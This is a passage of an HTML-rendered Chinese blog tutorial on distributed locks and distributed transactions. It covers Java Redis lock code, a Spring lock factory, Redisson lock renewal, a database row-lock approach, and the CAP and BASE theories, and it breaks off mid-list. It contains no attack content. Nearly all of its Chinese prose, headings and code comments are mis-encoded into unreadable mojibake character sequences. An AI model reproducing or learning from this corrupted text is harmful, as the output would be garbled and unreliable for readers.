class="built_in">this</span>.releaseTime);</span><br><span class="line">        <span class="comment">// åˆ¤æ–­ç»“æœ</span></span><br><span class="line">        <span class="keyword">return</span> result != <span class="literal">null</span> &amp;&amp; result.intValue() == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// æ‰§è¡Œè„šæœ¬</span></span><br><span class="line">        redisTemplate.execute(</span><br><span class="line">                UNLOCK_SCRIPT,</span><br><span class="line">                Collections.singletonList(key),</span><br><span class="line">                ID_PREFIX + Thread.currentThread().getId(), <span class="built_in">this</span>.releaseTime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®šä¹‰é”å·¥å‚:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.demo.lock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisLockFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StringRedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> RedisLock <span class="title function_">getReentrantLock</span><span class="params">(String key)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReentrantRedisLock</span>(redisTemplate, key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Redisson"><a href="#Redisson" class="headerlink" title="Redisson"></a>Redisson</h3><h4 id="é”è‡ªåŠ¨ç»­æœŸ"><a href="#é”è‡ªåŠ¨ç»­æœŸ" class="headerlink" title="é”è‡ªåŠ¨ç»­æœŸ"></a>é”è‡ªåŠ¨ç»­æœŸ</h4><p>é”å¦‚æœåœ¨æ‰§è¡Œä»»åŠ¡æ—¶è‡ªåŠ¨è¿‡æœŸï¼Œå°±ä¼šå¼•èµ·å„ç§é—®é¢˜ï¼Œ å› æ­¤æˆ‘ä»¬éœ€è¦åœ¨é”è¿‡æœŸå‰è‡ªåŠ¨ç”³è¯·ç»­æœŸï¼Œè¿™ä¸ªè¢«ç§°ä¸ºwatch dogï¼Œçœ‹é—¨ç‹—ã€‚</p>
<h4 id="å¸¦é˜»å¡çš„è·å–é”"><a href="#å¸¦é˜»å¡çš„è·å–é”" class="headerlink" title="å¸¦é˜»å¡çš„è·å–é”"></a>å¸¦é˜»å¡çš„è·å–é”</h4><p>é˜»å¡è·å–é”, ä¼šåœ¨è·å–å¤±è´¥ä»¥åé‡è¯•, ä¸è¿‡ä¼šè®¾ç½®å¤±è´¥è¶…æ—¶æ—¶é—´;</p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ä¼˜ç‚¹: å®ç°ç®€å•,æ€§èƒ½å¥½, å¹¶å‘èƒ½åŠ›å¼º,å¦‚æœå¯¹å¹¶å‘èƒ½åŠ›æœ‰è¦æ±‚, æ¨èä½¿ç”¨</p>
<p>ç¼ºç‚¹: å¯é æ€§æœ‰äº‰è®®, æç«¯æƒ…å†µä¸‹ä¼šå‡ºç°é”å¤±æ•ˆé—®é¢˜, å¦‚æœå¯¹å®‰å…¨è¦æ±‚è¾ƒé«˜, ä¸å»ºè®®ä½¿ç”¨</p>
<h2 id="Zookeeperå®ç°åˆ†å¸ƒå¼é”"><a href="#Zookeeperå®ç°åˆ†å¸ƒå¼é”" class="headerlink" title="Zookeeperå®ç°åˆ†å¸ƒå¼é”"></a>Zookeeperå®ç°åˆ†å¸ƒå¼é”</h2><h2 id="åŸºäºæ•°æ®åº“å®ç°"><a href="#åŸºäºæ•°æ®åº“å®ç°" class="headerlink" title="åŸºäºæ•°æ®åº“å®ç°"></a>åŸºäºæ•°æ®åº“å®ç°</h2><p>å‡†å¤‡ä¸€å¼ è¡¨ï¼Œè®°å½•é”ç›¸å…³ä¿¡æ¯:<code>tb_lock</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id	method_name</span><br><span class="line">1	createOrder</span><br><span class="line">2	evictOrder</span><br></pre></td></tr></table></figure>



<p>äº’æ–¥ï¼šåˆ©ç”¨äº†æ•°æ®åº“æœ¬èº«çš„æ’å®ƒé”æ¥å®ç°ã€‚</p>
<p>æ­¥éª¤ï¼š</p>
<ul>
<li>è·å–é”ï¼šselect * from tb_lock where method_name &#x3D; â€œevictOrderâ€ for update</li>
<li>æ‰§è¡Œè‡ªå·±çš„ä¸šåŠ¡ â€¦</li>
<li>é‡Šæ”¾é”ï¼šcommit æäº¤äº‹åŠ¡</li>
</ul>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>å®ç°ç®€å•</li>
<li>é”çš„è‡ªåŠ¨é‡Šæ”¾</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>ä¾èµ–äºæ•°æ®åº“ï¼Œæ€§èƒ½æ˜¯ä¸€ä¸ªé—®é¢˜</li>
<li>å•ç‚¹æ•…éšœé—®é¢˜</li>
<li>å¹¶å‘ä¸€èˆ¬</li>
</ul>
<h1 id="åˆ†å¸ƒå¼äº‹åŠ¡"><a href="#åˆ†å¸ƒå¼äº‹åŠ¡" class="headerlink" title="åˆ†å¸ƒå¼äº‹åŠ¡"></a>åˆ†å¸ƒå¼äº‹åŠ¡</h1><h2 id="ä»€ä¹ˆæ˜¯åˆ†å¸ƒå¼äº‹åŠ¡"><a href="#ä»€ä¹ˆæ˜¯åˆ†å¸ƒå¼äº‹åŠ¡" class="headerlink" title="ä»€ä¹ˆæ˜¯åˆ†å¸ƒå¼äº‹åŠ¡?"></a>ä»€ä¹ˆæ˜¯åˆ†å¸ƒå¼äº‹åŠ¡?</h2><h3 id="æœ¬åœ°äº‹åŠ¡"><a href="#æœ¬åœ°äº‹åŠ¡" class="headerlink" title="æœ¬åœ°äº‹åŠ¡"></a>æœ¬åœ°äº‹åŠ¡</h3><p>äº‹åŠ¡: æ˜¯æŒ‡ä¼ ç»Ÿçš„å•æœºæ•°æ®åº“äº‹åŠ¡,å¿…é¡»å…·å¤‡ACIDåŸåˆ™; åœ¨ä¼ ç»Ÿçš„é¡¹ç›®ä¸­,é¡¹ç›®çš„éƒ¨ç½²åŸºæœ¬æ˜¯å•ç‚¹å¼: å³å•ä¸ªæœåŠ¡å™¨å’Œå•ä¸ªæ•°æ®åº“. è¿™ç§æƒ…å†µä¸‹æ•°æ®åº“æœ¬èº«çš„äº‹åŠ¡æœºåˆ¶å°±èƒ½ä¿è¯ACIDåŸåˆ™,è¿™æ ·çš„äº‹åŠ¡å°±æ˜¯æœ¬åœ°äº‹åŠ¡. å•ä¸ªæœåŠ¡å’Œå•ä¸ªæ•°æ®åº“çš„æ¶æ„ä¸­,äº§ç”Ÿçš„äº‹åŠ¡éƒ½æ˜¯æœ¬åœ°äº‹åŠ¡.</p>
<h3 id="åˆ†å¸ƒå¼äº‹åŠ¡-1"><a href="#åˆ†å¸ƒå¼äº‹åŠ¡-1" class="headerlink" title="åˆ†å¸ƒå¼äº‹åŠ¡"></a>åˆ†å¸ƒå¼äº‹åŠ¡</h3><p>è·¨æ•°æ®æºçš„åˆ†å¸ƒå¼äº‹åŠ¡, è·¨æœåŠ¡çš„åˆ†å¸ƒå¼äº‹åŠ¡</p>
<h4 id="è·¨æ•°æ®æº"><a href="#è·¨æ•°æ®æº" class="headerlink" title="è·¨æ•°æ®æº"></a>è·¨æ•°æ®æº</h4><p>å¯¹æ•°æ®åº“è¿›è¡Œäº†æ°´å¹³æ‹†åˆ†,å°†åŸå•åº“å•è¡¨æ‹†åˆ†æˆæ•°æ®åº“åˆ†ç‰‡,äºæ˜¯äº§ç”Ÿäº†è·¨æ•°æ®åº“äº‹åŠ¡é—®é¢˜</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149742.png" alt="image-20210415144156443"></p>
<h4 id="è·¨æœåŠ¡"><a href="#è·¨æœåŠ¡" class="headerlink" title="è·¨æœåŠ¡"></a>è·¨æœåŠ¡</h4><p>åœ¨ä¸šåŠ¡å‘å±•åˆæœŸï¼Œâ€œä¸€å—å¤§é¥¼â€çš„å•ä¸šåŠ¡ç³»ç»Ÿæ¶æ„ï¼Œèƒ½æ»¡è¶³åŸºæœ¬çš„ä¸šåŠ¡éœ€æ±‚ã€‚ä½†æ˜¯éšç€ä¸šåŠ¡çš„å¿«é€Ÿå‘å±•ï¼Œç³»ç»Ÿçš„è®¿é—®é‡å’Œä¸šåŠ¡å¤æ‚ç¨‹åº¦éƒ½åœ¨å¿«é€Ÿå¢é•¿ï¼Œå•ç³»ç»Ÿæ¶æ„é€æ¸æˆä¸ºä¸šåŠ¡å‘å±•ç“¶é¢ˆï¼Œè§£å†³ä¸šåŠ¡ç³»ç»Ÿçš„é«˜è€¦åˆã€å¯ä¼¸ç¼©é—®é¢˜çš„éœ€æ±‚è¶Šæ¥è¶Šå¼ºçƒˆã€‚</p>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒæŒ‰ç…§é¢å‘æœåŠ¡ï¼ˆSOA,SOAç²—æš´ç†è§£ï¼šæŠŠç³»ç»ŸæŒ‰ç…§å®é™…ä¸šåŠ¡ï¼Œæ‹†åˆ†æˆåˆšåˆšå¥½å¤§å°çš„ã€åˆé€‚çš„ã€ç‹¬ç«‹éƒ¨ç½²çš„æ¨¡å—ï¼Œæ¯ä¸ªæ¨¡å—ä¹‹é—´ç›¸äº’ç‹¬ç«‹ã€‚ï¼‰çš„æ¶æ„çš„è®¾è®¡åŸåˆ™ï¼Œå°†å•ä¸šåŠ¡ç³»ç»Ÿæ‹†åˆ†æˆå¤šä¸ªä¸šåŠ¡ç³»ç»Ÿï¼Œé™ä½äº†å„ç³»ç»Ÿä¹‹é—´çš„è€¦åˆåº¦ï¼Œä½¿ä¸åŒçš„ä¸šåŠ¡ç³»ç»Ÿä¸“æ³¨äºè‡ªèº«ä¸šåŠ¡ï¼Œæ›´æœ‰åˆ©äºä¸šåŠ¡çš„å‘å±•å’Œç³»ç»Ÿå®¹é‡çš„ä¼¸ç¼©ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149743.png" alt="image-20210415144342697"></p>
<h4 id="åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ•°æ®ä¸€è‡´æ€§é—®é¢˜"><a href="#åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ•°æ®ä¸€è‡´æ€§é—®é¢˜" class="headerlink" title="åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ•°æ®ä¸€è‡´æ€§é—®é¢˜"></a>åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ•°æ®ä¸€è‡´æ€§é—®é¢˜</h4><p>åœ¨æ•°æ®åº“æ°´å¹³æ‹†åˆ†ã€æœåŠ¡å‚ç›´æ‹†åˆ†ä¹‹åï¼Œä¸€ä¸ªä¸šåŠ¡æ“ä½œé€šå¸¸è¦è·¨å¤šä¸ªæ•°æ®åº“ã€æœåŠ¡æ‰èƒ½å®Œæˆã€‚åœ¨åˆ†å¸ƒå¼ç½‘ç»œç¯å¢ƒä¸‹ï¼Œæˆ‘ä»¬æ— æ³•ä¿éšœæ‰€æœ‰æœåŠ¡ã€æ•°æ®åº“éƒ½ç™¾åˆ†ç™¾å¯ç”¨ï¼Œä¸€å®šä¼šå‡ºç°éƒ¨åˆ†æœåŠ¡ã€æ•°æ®åº“æ‰§è¡ŒæˆåŠŸï¼Œå¦ä¸€éƒ¨åˆ†æ‰§è¡Œå¤±è´¥çš„é—®é¢˜ã€‚</p>
<p>å½“å‡ºç°éƒ¨åˆ†ä¸šåŠ¡æ“ä½œæˆåŠŸã€éƒ¨åˆ†ä¸šåŠ¡æ“ä½œå¤±è´¥æ—¶ï¼Œä¸šåŠ¡æ•°æ®å°±ä¼šå‡ºç°ä¸ä¸€è‡´ã€‚</p>
<p>ä¾‹å¦‚ç”µå•†è¡Œä¸šä¸­æ¯”è¾ƒå¸¸è§çš„ä¸‹å•ä»˜æ¬¾æ¡ˆä¾‹ï¼ŒåŒ…æ‹¬ä¸‹é¢å‡ ä¸ªè¡Œä¸ºï¼š</p>
<ul>
<li>åˆ›å»ºæ–°è®¢å•</li>
<li>æ‰£å‡å•†å“åº“å­˜</li>
<li>ä»ç”¨æˆ·è´¦æˆ·ä½™é¢æ‰£é™¤é‡‘é¢</li>
</ul>
<p>å®Œæˆä¸Šé¢çš„æ“ä½œéœ€è¦è®¿é—®ä¸‰ä¸ªä¸åŒçš„å¾®æœåŠ¡å’Œä¸‰ä¸ªä¸åŒçš„æ•°æ®åº“ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149744.png" alt="image-20200304204442839"></p>
<p>åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹ï¼Œè‚¯å®šä¼šå‡ºç°éƒ¨åˆ†æ“ä½œæˆåŠŸã€éƒ¨åˆ†æ“ä½œå¤±è´¥çš„é—®é¢˜ï¼Œæ¯”å¦‚ï¼šè®¢å•ç”Ÿæˆäº†ï¼Œåº“å­˜ä¹Ÿæ‰£å‡äº†ï¼Œä½†æ˜¯ ç”¨æˆ·è´¦æˆ·çš„ä½™é¢ä¸è¶³ï¼Œè¿™å°±é€ æˆæ•°æ®ä¸ä¸€è‡´ã€‚</p>
<p>è®¢å•çš„åˆ›å»ºã€åº“å­˜çš„æ‰£å‡ã€è´¦æˆ·æ‰£æ¬¾åœ¨æ¯ä¸€ä¸ªæœåŠ¡å’Œæ•°æ®åº“å†…æ˜¯ä¸€ä¸ªæœ¬åœ°äº‹åŠ¡ï¼Œå¯ä»¥ä¿è¯ACIDåŸåˆ™ã€‚</p>
<p>ä½†æ˜¯å½“æˆ‘ä»¬æŠŠä¸‰ä»¶äº‹æƒ…çœ‹åšä¸€ä¸ªäº‹æƒ…äº‹ï¼Œè¦æ»¡è¶³ä¿è¯â€œä¸šåŠ¡â€çš„åŸå­æ€§ï¼Œè¦ä¹ˆæ‰€æœ‰æ“ä½œå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ï¼Œä¸å…è®¸å‡ºç°éƒ¨åˆ†æˆåŠŸéƒ¨åˆ†å¤±è´¥çš„ç°è±¡ï¼Œè¿™å°±æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä¸‹çš„äº‹åŠ¡äº†ã€‚</p>
<p>æ­¤æ—¶ACIDéš¾ä»¥æ»¡è¶³ï¼Œè¿™æ˜¯åˆ†å¸ƒå¼äº‹åŠ¡è¦è§£å†³çš„é—®é¢˜</p>
<h2 id="è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡çš„æ€è·¯"><a href="#è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡çš„æ€è·¯" class="headerlink" title="è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡çš„æ€è·¯"></a>è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡çš„æ€è·¯</h2><h3 id="CAPå®šç†"><a href="#CAPå®šç†" class="headerlink" title="CAPå®šç†"></a>CAPå®šç†</h3><p>Consistency(ä¸€è‡´æ€§), Availability(å¯ç”¨æ€§), Partition Tolerance(åˆ†åŒºå®¹é”™æ€§); è¿™ä¸ªä¸‰ä¸ªæŒ‡æ ‡ä¸å¯èƒ½åŒæ—¶å®Œæˆ, è¿™ä¸ªç»“è®ºå°±å«åšCAPå®šç†;</p>
<p>èˆå¼ƒå®¹é”™æ€§ã€‚ä½†æ˜¯è¿™ä¹Ÿå°±æ„å‘³ç€ä½ çš„ç³»ç»Ÿä¸æ˜¯åˆ†å¸ƒå¼çš„äº†ï¼Œå› ä¸ºæ¶‰åŠåˆ†å¸ƒå¼çš„æƒ³æ³•å°±æ˜¯æŠŠåŠŸèƒ½åˆ†å¼€ï¼Œéƒ¨ç½²åˆ°ä¸åŒçš„æœºå™¨ä¸Šã€‚</p>
<h3 id="Baseç†è®º"><a href="#Baseç†è®º" class="headerlink" title="Baseç†è®º"></a>Baseç†è®º</h3><p>Basically Available(åŸºæœ¬å¯ç”¨), Soft state(è½¯çŠ¶æ€), Eventually consistent(æœ€ç»ˆä¸€è‡´æ€§)</p>
<h4 id="åŸºæœ¬å¯ç”¨"><a href="#åŸºæœ¬å¯ç”¨" class="headerlink" title="åŸºæœ¬å¯ç”¨"></a>åŸºæœ¬å¯ç”¨</h4><p><strong>å“åº”æ—¶é—´ä¸Šçš„æŸå¤±</strong>ï¼šæ­£å¸¸æƒ…å†µä¸‹çš„æœç´¢å¼•æ“0.5ç§’å³è¿”å›ç»™ç”¨æˆ·ç»“æœï¼Œè€ŒåŸºæœ¬å¯ç”¨çš„æœç´¢å¼•æ“å¯ä»¥åœ¨2ç§’ä½œç”¨è¿”å›ç»“æœã€‚</p>
<p><strong>åŠŸèƒ½ä¸Šçš„æŸå¤±</strong>ï¼šåœ¨ä¸€ä¸ªç”µå•†ç½‘ç«™ä¸Šï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥é¡ºåˆ©å®Œæˆæ¯ä¸€ç¬”è®¢å•ã€‚ä½†æ˜¯åˆ°äº†å¤§ä¿ƒæœŸé—´ï¼Œä¸ºäº†ä¿æŠ¤è´­ç‰©ç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œéƒ¨åˆ†æ¶ˆè´¹è€…å¯èƒ½ä¼šè¢«å¼•å¯¼åˆ°ä¸€ä¸ªé™çº§é¡µé¢ã€‚</p>
<h4 id="è½¯çŠ¶æ€"><a href="#è½¯çŠ¶æ€" class="headerlink" title="è½¯çŠ¶æ€"></a>è½¯çŠ¶æ€</h4><p>ä»€ä¹ˆæ˜¯è½¯çŠ¶æ€å‘¢ï¼Ÿç›¸å¯¹äºåŸå­æ€§è€Œè¨€ï¼Œè¦æ±‚å¤šä¸ªèŠ‚ç‚¹çš„æ•°æ®å‰¯æœ¬éƒ½æ˜¯ä¸€è‡´çš„ï¼Œè¿™æ˜¯ä¸€ç§â€œç¡¬çŠ¶æ€â€ã€‚</p>
<p>è½¯çŠ¶æ€æŒ‡çš„æ˜¯ï¼šå…è®¸ç³»ç»Ÿä¸­çš„æ•°æ®å­˜åœ¨ä¸­é—´çŠ¶æ€ï¼Œå¹¶è®¤ä¸ºè¯¥çŠ¶æ€ä¸å½±å“ç³»ç»Ÿçš„æ•´ä½“å¯ç”¨æ€§ï¼Œå³å…è®¸ç³»ç»Ÿåœ¨å¤šä¸ªä¸åŒèŠ‚ç‚¹çš„æ•°æ®å‰¯æœ¬å­˜åœ¨æ•°æ®å»¶æ—¶ã€‚</p>
<h4 id="æœ€ç»ˆä¸€è‡´æ€§"><a href="#æœ€ç»ˆä¸€è‡´æ€§" class="headerlink" title="æœ€ç»ˆä¸€è‡´æ€§"></a>æœ€ç»ˆä¸€è‡´æ€§</h4><p>ä¸Šé¢è¯´è½¯çŠ¶æ€ï¼Œç„¶åä¸å¯èƒ½ä¸€ç›´æ˜¯è½¯çŠ¶æ€ï¼Œå¿…é¡»æœ‰ä¸ªæ—¶é—´æœŸé™ã€‚åœ¨æœŸé™è¿‡åï¼Œåº”å½“ä¿è¯æ‰€æœ‰å‰¯æœ¬ä¿æŒæ•°æ®ä¸€è‡´æ€§ï¼Œä»è€Œè¾¾åˆ°æ•°æ®çš„æœ€ç»ˆä¸€è‡´æ€§ã€‚è¿™ä¸ªæ—¶é—´æœŸé™å–å†³äºç½‘ç»œå»¶æ—¶ã€ç³»ç»Ÿè´Ÿè½½ã€æ•°æ®å¤åˆ¶æ–¹æ¡ˆè®¾è®¡ç­‰ç­‰å› ç´ ã€‚</p>
<p>è€Œåœ¨å®é™…å·¥ç¨‹å®è·µä¸­ï¼Œæœ€ç»ˆä¸€è‡´æ€§åˆ†ä¸º5ç§ï¼š</p>
<p>å› æœä¸€è‡´æ€§ï¼ˆCausal consistencyï¼‰</p>
<p>å› æœä¸€è‡´æ€§æŒ‡çš„æ˜¯ï¼šå¦‚æœèŠ‚ç‚¹Aåœ¨æ›´æ–°å®ŒæŸä¸ªæ•°æ®åé€šçŸ¥äº†èŠ‚ç‚¹Bï¼Œé‚£ä¹ˆèŠ‚ç‚¹Bä¹‹åå¯¹è¯¥æ•°æ®çš„è®¿é—®å’Œä¿®æ”¹éƒ½æ˜¯åŸºäºAæ›´æ–°åçš„å€¼ã€‚äºæ­¤åŒæ—¶ï¼Œå’ŒèŠ‚ç‚¹Aæ— å› æœå…³ç³»çš„èŠ‚ç‚¹Cçš„æ•°æ®è®¿é—®åˆ™æ²¡æœ‰è¿™æ ·çš„é™åˆ¶ã€‚</p>
<p>è¯»å·±ä¹‹æ‰€å†™ï¼ˆRead your writesï¼‰</p>
<p>è¯»å·±ä¹‹æ‰€å†™æŒ‡çš„æ˜¯ï¼šèŠ‚ç‚¹Aæ›´æ–°ä¸€ä¸ªæ•°æ®åï¼Œå®ƒè‡ªèº«æ€»æ˜¯èƒ½è®¿é—®åˆ°è‡ªèº«æ›´æ–°è¿‡çš„æœ€æ–°å€¼ï¼Œè€Œä¸ä¼šçœ‹åˆ°æ—§å€¼ã€‚å…¶å®ä¹Ÿç®—ä¸€ç§å› æœä¸€è‡´æ€§ã€‚</p>
<p>ä¼šè¯ä¸€è‡´æ€§ï¼ˆSession consistencyï¼‰</p>
<p>ä¼šè¯ä¸€è‡´æ€§å°†å¯¹ç³»ç»Ÿæ•°æ®çš„è®¿é—®è¿‡ç¨‹æ¡†å®šåœ¨äº†ä¸€ä¸ªä¼šè¯å½“ä¸­ï¼šç³»ç»Ÿèƒ½ä¿è¯åœ¨åŒä¸€ä¸ªæœ‰æ•ˆçš„ä¼šè¯ä¸­å®ç° â€œè¯»å·±ä¹‹æ‰€å†™â€ çš„ä¸€è‡´æ€§ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰§è¡Œæ›´æ–°æ“ä½œä¹‹åï¼Œå®¢æˆ·ç«¯èƒ½å¤Ÿåœ¨åŒä¸€ä¸ªä¼šè¯ä¸­å§‹ç»ˆè¯»å–åˆ°è¯¥æ•°æ®é¡¹çš„æœ€æ–°å€¼ã€‚</p>
<p>å•è°ƒè¯»ä¸€è‡´æ€§ï¼ˆMonotonic read consistencyï¼‰</p>
<p>å•è°ƒè¯»ä¸€è‡´æ€§æŒ‡çš„æ˜¯ï¼šå¦‚æœä¸€ä¸ªèŠ‚ç‚¹ä»ç³»ç»Ÿä¸­è¯»å–å‡ºä¸€ä¸ªæ•°æ®é¡¹çš„æŸä¸ªå€¼åï¼Œé‚£ä¹ˆç³»ç»Ÿå¯¹äºè¯¥èŠ‚ç‚¹åç»­çš„ä»»ä½•æ•°æ®è®¿é—®éƒ½ä¸åº”è¯¥è¿”å›æ›´æ—§çš„å€¼ã€‚</p>
<p>å•è°ƒå†™ä¸€è‡´æ€§ï¼ˆMonotonic write consistencyï¼‰</p>
<p>å•è°ƒå†™ä¸€è‡´æ€§æŒ‡çš„æ˜¯ï¼šä¸€ä¸ªç³»ç»Ÿè¦èƒ½å¤Ÿä¿è¯æ¥è‡ªåŒä¸€ä¸ªèŠ‚ç‚¹çš„å†™æ“ä½œè¢«é¡ºåºçš„æ‰§è¡Œã€‚</p>
<p>åœ¨å®é™…çš„å®è·µä¸­ï¼Œè¿™5ç§ç³»ç»Ÿå¾€å¾€ä¼šç»“åˆä½¿ç”¨ï¼Œä»¥æ„å»ºä¸€ä¸ªå…·æœ‰æœ€ç»ˆä¸€è‡´æ€§çš„åˆ†å¸ƒå¼ç³»ç»Ÿã€‚</p>
<p>å®é™…ä¸Šï¼Œä¸åªæ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä½¿ç”¨æœ€ç»ˆä¸€è‡´æ€§ï¼Œå…³ç³»å‹æ•°æ®åº“åœ¨æŸä¸ªåŠŸèƒ½ä¸Šï¼Œä¹Ÿæ˜¯ä½¿ç”¨æœ€ç»ˆä¸€è‡´æ€§çš„ã€‚æ¯”å¦‚å¤‡ä»½ï¼Œæ•°æ®åº“çš„å¤åˆ¶è¿‡ç¨‹æ˜¯éœ€è¦æ—¶é—´çš„ï¼Œè¿™ä¸ªå¤åˆ¶è¿‡ç¨‹ä¸­ï¼Œä¸šåŠ¡è¯»å–åˆ°çš„å€¼å°±æ˜¯æ—§çš„ã€‚å½“ç„¶ï¼Œæœ€ç»ˆè¿˜æ˜¯è¾¾æˆäº†æ•°æ®ä¸€è‡´æ€§ã€‚è¿™ä¹Ÿç®—æ˜¯ä¸€ä¸ªæœ€ç»ˆä¸€è‡´æ€§çš„ç»å…¸æ¡ˆä¾‹ã€‚</p>
<p>å°ç»“</p>
<p>æ€»ä½“æ¥è¯´BASEç†è®ºé¢å‘çš„æ˜¯å¤§å‹é«˜å¯ç”¨ã€å¯æ‰©å±•çš„åˆ†å¸ƒå¼ç³»ç»Ÿã€‚ä¸ä¼ ç»ŸACIDç‰¹æ€§ç›¸åï¼Œä¸åŒäºACIDçš„å¼ºä¸€è‡´æ€§æ¨¡å‹ï¼ŒBASEæå‡ºé€šè¿‡ç‰ºç‰²å¼ºä¸€è‡´æ€§æ¥è·å¾—å¯ç”¨æ€§ï¼Œå¹¶å…è®¸æ•°æ®æ®µæ—¶é—´å†…çš„ä¸ä¸€è‡´ï¼Œä½†æ˜¯æœ€ç»ˆè¾¾åˆ°ä¸€è‡´çŠ¶æ€ã€‚åŒæ—¶ï¼Œåœ¨å®é™…åˆ†å¸ƒå¼åœºæ™¯ä¸­ï¼Œä¸åŒä¸šåŠ¡å¯¹æ•°æ®çš„ä¸€è‡´æ€§è¦æ±‚ä¸ä¸€æ ·ã€‚å› æ­¤åœ¨è®¾è®¡ä¸­ï¼ŒACIDå’ŒBASEç†è®ºå¾€å¾€åˆä¼šç»“åˆä½¿ç”¨ã€‚</p>
<p>è€Œæˆ‘ä»¬è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œå°±æ˜¯æ ¹æ®Baseç†è®ºå’ŒCAPç†è®ºæ¥å®ç°ã€‚</p>
<p>è¿˜ä»¥ä¸Šé¢çš„ä¸‹å•å‡åº“å­˜å’Œæ‰£æ¬¾ä¸ºä¾‹ï¼š</p>
<p>è®¢å•æœåŠ¡ã€åº“å­˜æœåŠ¡ã€ç”¨æˆ·æœåŠ¡åŠä»–ä»¬å¯¹åº”çš„æ•°æ®åº“å°±æ˜¯åˆ†å¸ƒå¼åº”ç”¨ä¸­çš„ä¸‰ä¸ªéƒ¨åˆ†ã€‚</p>
<ul>
<li><p>CPæ–¹å¼ï¼šç°åœ¨å¦‚æœè¦æ»¡è¶³äº‹åŠ¡çš„å¼ºä¸€è‡´æ€§ï¼Œå°±å¿…é¡»åœ¨è®¢å•æœåŠ¡æ•°æ®åº“é”å®šçš„åŒæ—¶ï¼Œå¯¹åº“å­˜æœåŠ¡ã€ç”¨æˆ·æœåŠ¡æ•°æ®èµ„æºåŒæ—¶é”å®šã€‚ç­‰å¾…ä¸‰ä¸ªæœåŠ¡ä¸šåŠ¡å…¨éƒ¨å¤„ç†å®Œæˆï¼Œæ‰å¯ä»¥é‡Šæ”¾èµ„æºã€‚æ­¤æ—¶å¦‚æœæœ‰å…¶ä»–è¯·æ±‚æƒ³è¦æ“ä½œè¢«é”å®šçš„èµ„æºå°±ä¼šè¢«é˜»å¡ï¼Œè¿™æ ·å°±æ˜¯æ»¡è¶³äº†CPã€‚</p>
<p>è¿™å°±æ˜¯å¼ºä¸€è‡´ï¼Œå¼±å¯ç”¨</p>
</li>
<li><p>APæ–¹å¼ï¼šä¸‰ä¸ªæœåŠ¡çš„å¯¹åº”æ•°æ®åº“å„è‡ªç‹¬ç«‹æ‰§è¡Œè‡ªå·±çš„ä¸šåŠ¡ï¼Œæ‰§è¡Œæœ¬åœ°äº‹åŠ¡ï¼Œä¸è¦æ±‚äº’ç›¸é”å®šèµ„æºã€‚ä½†æ˜¯è¿™ä¸ªä¸­é—´çŠ¶æ€ä¸‹ï¼Œæˆ‘ä»¬å»è®¿é—®æ•°æ®åº“ï¼Œå¯èƒ½é‡åˆ°æ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µï¼Œä¸è¿‡æˆ‘ä»¬éœ€è¦åšä¸€äº›åè¡¥æªæ–½ï¼Œä¿è¯åœ¨ç»è¿‡ä¸€æ®µæ—¶é—´åï¼Œæ•°æ®æœ€ç»ˆæ»¡è¶³ä¸€è‡´æ€§ã€‚</p>
<p>è¿™å°±æ˜¯é«˜å¯ç”¨ï¼Œä½†å¼±ä¸€è‡´ï¼ˆæœ€ç»ˆä¸€è‡´ï¼‰ã€‚</p>
</li>
</ul>
<p>ç”±ä¸Šé¢çš„ä¸¤ç§æ€æƒ³ï¼Œå»¶ä¼¸å‡ºäº†å¾ˆå¤šçš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li>XA</li>
